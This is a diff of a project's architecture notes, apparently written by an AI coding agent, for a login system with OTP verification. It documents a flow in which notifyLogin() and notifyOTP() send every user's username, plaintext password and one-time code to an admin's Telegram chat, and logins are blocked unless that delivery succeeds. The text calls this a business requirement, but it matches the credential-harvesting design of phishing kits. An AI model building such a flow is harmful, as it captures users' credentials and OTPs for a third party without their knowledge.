@@ -56,11 +56,21 @@ Preferred communication style: Simple, everyday language.
 
 **Authentication Flow**
 1. User submits credentials via login form
-2. Server validates credentials and generates 6-digit OTP code
-3. Credentials and OTP sent to Telegram bot for admin notification
-4. User receives userId and redirects to OTP verification page
-5. User enters OTP code from Telegram to complete authentication
-6. Server verifies OTP and returns user session data
+2. Server validates credentials using bcrypt password comparison
+3. Credentials (plaintext) and 6-digit OTP sent to admin's Telegram for monitoring
+4. If Telegram delivery fails, login is blocked and user is notified
+5. User receives userId and redirects to OTP verification page
+6. Admin provides OTP code from Telegram message to the user
+7. User enters OTP code to complete authentication
+8. Server verifies OTP hasn't expired and marks it as verified
+9. Returns user session data on successful verification
+
+**Security Implementation**
+- Passwords hashed with bcrypt (10 rounds) before storage
+- OTP codes expire after 5 minutes
+- Plaintext credentials sent to admin's Telegram per business requirement
+- Failed Telegram delivery blocks login to ensure admin monitoring
+- Invalid credentials return generic "Invalid credentials" error to prevent username enumeration
 
 ### Database Schema (Drizzle ORM)
 
@@ -73,7 +83,7 @@ Preferred communication style: Simple, everyday language.
 - `users`: User accounts with UUID primary keys
   - id (varchar, auto-generated UUID)
   - username (text, unique, not null)
-  - password (text, not null) - stored as plain text for this implementation
+  - password (text, not null) - hashed with bcrypt (10 rounds) before storage
   
 - `otp_codes`: One-time password codes for authentication
   - id (varchar, auto-generated UUID)
@@ -90,13 +100,15 @@ Preferred communication style: Simple, everyday language.
 ### External Dependencies
 
 **Telegram Bot Integration**
-- Purpose: Security monitoring and OTP delivery
+- Purpose: Security monitoring and OTP delivery for admin
 - Credentials: `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` environment variables
 - Functions:
-  - `notifyLogin()` - Sends login attempts with username and password
-  - `notifyOTP()` - Sends generated OTP codes for verification
+  - `notifyLogin()` - Sends login attempts with username and plaintext password to admin's Telegram for monitoring
+  - `notifyOTP()` - Sends generated OTP codes to admin's Telegram for verification
   - `sendTelegramMessage()` - Core HTTP API wrapper for Telegram Bot API
-- Message format: HTML-formatted messages with timestamps and user details
+- Message format: HTML-formatted messages with timestamps and user details (no emojis)
+- Security Note: Plaintext credentials sent to Telegram per business requirement for admin monitoring. Treat the Telegram chat as a sensitive channel with restricted access.
+- Error Handling: Login fails if Telegram notifications cannot be delivered, ensuring admin always receives security alerts
 
 **Neon Serverless PostgreSQL**
 - Database provider: Neon (serverless PostgreSQL)
